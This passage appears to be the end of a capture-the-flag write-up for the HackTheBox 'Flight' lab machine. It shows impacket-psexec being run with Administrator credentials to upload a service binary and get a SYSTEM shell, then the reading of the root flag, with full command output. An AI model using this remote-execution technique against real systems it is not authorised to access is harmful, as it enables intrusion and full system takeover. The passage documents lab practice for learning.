And then I'll use psexec to achieve a shell as SYSTEM.

```powershell
┌──(kali㉿kali)-[~/hackthebox/flight/smb]
└─$ impacket-psexec Administrator:'newpass00**'@flight.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on flight.htb.....
[*] Found writable share ADMIN$
[*] Uploading file VsGVNABs.exe
[*] Opening SVCManager on flight.htb.....
[*] Creating service ZRhf on flight.htb.....
[*] Starting service ZRhf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

And our root.txt is in the Administrator's directory.

```powershell
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/22/2026   1:40 PM             34 root.txt                                                              


PS C:\Users\Administrator\Desktop> cat root.txt
f317ca83517...
```
